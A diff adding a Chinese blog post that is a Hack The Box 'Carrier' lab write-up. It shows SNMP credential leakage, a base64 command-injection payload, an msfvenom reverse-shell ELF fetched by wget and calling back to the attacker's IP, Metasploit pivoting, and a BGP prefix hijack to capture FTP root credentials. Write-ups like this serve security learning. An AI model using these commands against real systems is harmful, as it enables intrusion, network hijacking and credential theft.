@@ -3,6 +3,259 @@
   
     
     <entry>
+      <title><![CDATA[HTB靶机渗透实战Writeup_Carrier]]></title>
+      <url>/2019/07/09/HTB%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98Writeup-Carrier/</url>
+      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大家好,我是成都B1ngDa0，今天给大家带来HTB(hackthebox)的一个靶机：Carrier的writeup，作为一篇自己回顾整理知识点以及分享给大家的文章，还望斧正。  </p>
+<h1 id="本文涉及知识点"><a href="#本文涉及知识点" class="headerlink" title="本文涉及知识点:"></a>本文涉及知识点:</h1><p>SNMP弱口令public泄露  </p>
+<p>Python本地服务器搭建  </p>
+<p>命令执行绕过  </p>
+<p>MSF结合NMAP进行内网扫描  </p>
+<p>BGP前缀劫持  </p>
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>Carrier靶机地址: <a href="https://www.hackthebox.eu/home/machines/profile/155" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/155</a></p>
+<p>目标IP: 10.10.10.105(Linux)</p>
+<p>本机IP: 10.10.14.3(Kali)</p>
+<p>目标:获取user.txt以及root.txt(分别为获取目标的普通用户权限以及管理员权限)</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>NMAP端口扫描</p>
+<p>首先使用NMAP对目标进行端口扫描，以确定下一步的操作：</p>
+<p><code>nmap -sC -sV -oA Carrier 10.10.10.105</code>  #通过默认脚本扫描获取版本并导出为文件</p>
+<figure class="image-box">
+                <img src="https://i.postimg.cc/Y9ThKbRC/01.png" alt title class>
+                <p></p>
+            </figure>
+
+<p><code>nmap -sU -sV -oA test 10.10.10.105</code> #通过udp扫描获取版本并导出为文件</p>
+<figure class="image-box">
+                <img src="https://i.postimg.cc/Pq3CKt8Z/02.png" alt title class>
+                <p></p>
+            </figure>
+
+<p> 得知21、80、161端口开放，且161端口SNMP共同体pulic开启</p>
+<p>因为是靶机渗透，所以账号爆破的操作不被优先考虑。</p>
+<p>对网页进行访问获取更多信息：</p>
+<figure class="image-box">
+                <img src="https://i.postimg.cc/SxG22LSg/2.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>只有一个登陆框以及两个错误代码。</p>
+<p>进行目录爆破：</p>
+<figure class="image-box">
+                <img src="https://i.postimg.cc/dVFZVNY7/0.png" alt title class>
+                <p></p>
+            </figure>
+
+<figure class="image-box">
+                <img src="https://i.postimg.cc/4x440DG1/11111.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>获得/doc/文件下的</p>
+<p>网络拓扑图：</p>
+<figure class="image-box">
+                <img src="https://i.postimg.cc/m2CFRf0f/3.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>以及网站系统错误代码文档：</p>
+<figure class="image-box">
+                <img src="https://i.postimg.cc/xdTkKkqn/4.png" alt title class>
+                <p></p>
+            </figure>
+
+
+
+<p>得知：网站使用默认的用户名admin以及密码序列号，我们访问的网页处于AS100机器中，AS200有FTP服务，AS300进行FTP连接操作。</p>
+<p>没有发现其他有用信息，接下来进行161端口的SNMP弱口令pulic的利用：</p>
+<p>所需工具：snmpwalk</p>
+<p><code>snmpwalk -v 1 -c public 10.10.10.105</code> # -v指定协议版本 -c 指定共同体字符串</p>
+<figure class="image-box">
+                <img src="https://i.postimg.cc/wv17GShr/5.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>获得密码NET_45JDX23</p>
+<p>利用凭据登录</p>
+<figure class="image-box">
+                <img src="https://i.postimg.cc/tCQYBv7r/6.png" alt title class>
+                <p></p>
+            </figure>
+
+<figure class="image-box">
+                <img src="https://i.postimg.cc/sfZM9CfQ/7.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>得知：10.120.15.0/24网段中存在FTP服务</p>
+<p>可在diag.php页面进行命令执行。</p>
+<p>## 获取USER权限</p>
+<p>使用burpsuite对diag页面数据进行抓取</p>
+<figure class="image-box">
+                <img src="https://i.postimg.cc/wMJ36L4c/8.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>命令参数为check,为base64编码，解码为quagga 与页面显示结果符合。</p>
+<p>直接将简单的Linux命令进行base64编码并代入参数，发现页面返回空白</p>
+<figure class="image-box">
+                <img src="https://i.postimg.cc/xTvqhGz9/9.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>测试最简单的命令绕过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cXVhZ2dhIHwgbHM=    #quagga | ls</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <img src="https://i.postimg.cc/3x3WTyXm/10.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>执行成功可以看到user.txt已经躺着那里了，user.txt目标完成</p>
+<h2 id="获取ROOT权限"><a href="#获取ROOT权限" class="headerlink" title="获取ROOT权限"></a>获取ROOT权限</h2><p>已知信息：</p>
+<p>目前为root权限但并不是目标主机10.10.10.105的root，目前我们处于网络拓扑图中的AS100主机</p>
+<p>为了更详细方便的获取信息，使用msfvenom生成elf文件进行反弹shell至msf上.</p>
+<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=3333 -f elf &gt; shell.elf</code>  #使用linux/x86/meterpreter/reverse_tcp payload，将shell反弹至10.10.14.3的3333端口，生成之后使用python2中的SimpleHTTPServer模块进行快速搭建http服务</p>
+<figure class="image-box">
+                <img src="https://i.postimg.cc/3wRRkPbw/12.png" alt title class>
+                <p></p>
+            </figure>
+
+
+
+<p>在命令执行的地方获取并执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.3:8000/shell.elf</span><br><span class="line">chmod 777 shell.elf</span><br></pre></td></tr></table></figure>
+
+<p>在本地msf监听3333端口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 10.10.14.3</span><br><span class="line">set LPORT 3333</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <img src="https://i.postimg.cc/d0x0r4zj/13.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>在目标机执行./shell.elf </p>
+<p>命令执行处较为麻烦就不进行截图了</p>
+<p>成功获得反弹shell：</p>
+<figure class="image-box">
+                <img src="https://i.postimg.cc/SNhx6Xt3/14.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>接下来需要对目标的网络环境进行详细查探：</p>
+<p>添加路由：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/manage/autoroute</span><br><span class="line">set session 1</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <img src="https://i.postimg.cc/cCQ4qZ6F/16.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>可以看到网络很复杂并且没有目标ip。</p>
+<figure class="image-box">
+                <img src="https://i.postimg.cc/76JZVS48/17.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>route中的ip将通过session 1进行访问</p>
+<p>接下来设置SOCKS代理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks4a</span><br><span class="line">set srvport 1090</span><br><span class="line">run -j</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <img src="https://i.postimg.cc/j2VdkCqW/18.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>成功设置后</p>
+<p>我们将通过proxychains包 进行代理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install proxychains</span><br></pre></td></tr></table></figure>
+
+<p>未安装可使用以上命令进行安装</p>
+<p>编辑/etc/proxychains.conf 进行配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/proxychains.conf</span><br></pre></td></tr></table></figure>
+
+<p>添加以下内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line">#add proxy here ...</span><br><span class="line">#meanwile</span><br><span class="line">#defaults set to &quot;tor&quot;</span><br><span class="line">socks4  127.0.0.1 1090</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <img src="https://i.postimg.cc/9XTfwP1y/19.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>配置成功，在终端运行proxychains [工具] 将使用代理运行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -Pn 10.120.15.0/24 -p 21,22,23,25,80,443,445,3389,8000,8080</span><br></pre></td></tr></table></figure>
+
+<p>使用nmap扫描10.120.15网段中开启的关键端口</p>
+<figure class="image-box">
+                <img src="https://i.postimg.cc/fTfTBwGL/20.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>发现10.120.15.10开放FTP服务</p>
+<p>未获取其他有效信息，现在查看之前已控制主机的网络</p>
+<p>netstat -pantu</p>
+<figure class="image-box">
+                <img src="https://i.postimg.cc/tgYqqFYZ/21.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>有bgp服务的2601端口开放，根据之前得到的信息，我们现在需要进行BGP劫持获得AS200(10.120.15.10) FTP尝试登陆的账号密码</p>
+<p>思路：通过修改bgp路由欺骗AS200将数据传输至已控主机。</p>
+<p>在已控主机中依次运行以下命令</p>
+<p>路由伪造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vtysh</span><br><span class="line">config terminal</span><br><span class="line">router bgp 100</span><br><span class="line">network 10.120.15.0/32</span><br><span class="line">end</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
+
+<p>IP伪造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip address add 10.120.15.10/24 dev eth2</span><br></pre></td></tr></table></figure>
+
+<p>现在10.120.15.10已经将数据源源不断的传至已控主机</p>
+<p>为了获得FTP登陆的数据，我们可在已控主机搭建FTP服务</p>
+<p>使用以下FTP脚本：</p>
+<p>代码较冗长，我已上传至Github:</p>
+<p><a href="https://github.com/b1ngda0/FtpServicePython/" target="_blank" rel="noopener">https://github.com/b1ngda0/FtpServicePython/</a></p>
+<figure class="image-box">
+                <img src="https://i.postimg.cc/wjWxYwTY/22.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>运行后可以看到已经获取到账号root以及登陆密码</p>
+<p>使用ssh进行登录</p>
+<figure class="image-box">
+                <img src="https://i.postimg.cc/1z29f4qW/23.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>已经获取root权限以及root.txt</p>
+<p>渗透完成！</p>
+<h1 id="个人感悟"><a href="#个人感悟" class="headerlink" title="个人感悟"></a>个人感悟</h1><p>文中的bgp劫持类似于arp欺骗，靶机环境为一个网关两台路由器，一台路由器连接一台服务器，服务器接收到消息后先找路由器，我们通过路由伪造，使两台路由器地址一样，又进行了IP伪造，使IP离AS200近，于是AS200将数据传输至已控主机，此时我们使用ftp脚本获取或者进行tcpdump抓包就可以获取数据。</p>
+<h1 id="文献参考"><a href="#文献参考" class="headerlink" title="文献参考"></a>文献参考</h1><p>snmap弱口令：</p>
+<p><a href="https://blog.csdn.net/archersaber39/article/details/78932252" target="_blank" rel="noopener">https://blog.csdn.net/archersaber39/article/details/78932252</a></p>
+<p>msf代理设置nmap扫描：</p>
+<p><a href="https://blog.csdn.net/h4ck0ne/article/details/50570749" target="_blank" rel="noopener">https://blog.csdn.net/h4ck0ne/article/details/50570749</a></p>
+<p><a href="http://www.blackhillsinfosec.com/use-nmap-meterpreter" target="_blank" rel="noopener">http://www.blackhillsinfosec.com/use-nmap-meterpreter</a></p>
+<p>bgp劫持：</p>
+<p><a href="https://en.wikipedia.org/wiki/BGP_hijacking" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/BGP_hijacking</a> </p>
+<p><a href="https://www.isi.deterlab.net/file.php?file=/share/shared/BGPhijacking" target="_blank" rel="noopener">https://www.isi.deterlab.net/file.php?file=/share/shared/BGPhijacking</a> </p>
+<p><a href="https://github.com/mininet/mininet/wiki/BGP-Path-Hijacking-Attack-Demo" target="_blank" rel="noopener">https://github.com/mininet/mininet/wiki/BGP-Path-Hijacking-Attack-Demo</a></p>
+<p><a href="http://cs.slu.edu/~espositof/teaching/4650/lab3/" target="_blank" rel="noopener">http://cs.slu.edu/~espositof/teaching/4650/lab3/</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> HTB靶机渗透实战Writeup </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 靶机writeup </tag>
+            
+            <tag> hackthebox </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[第一篇博客]]></title>
       <url>/2019/07/09/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
       <content type="html"><![CDATA[<p>Hello world</p>
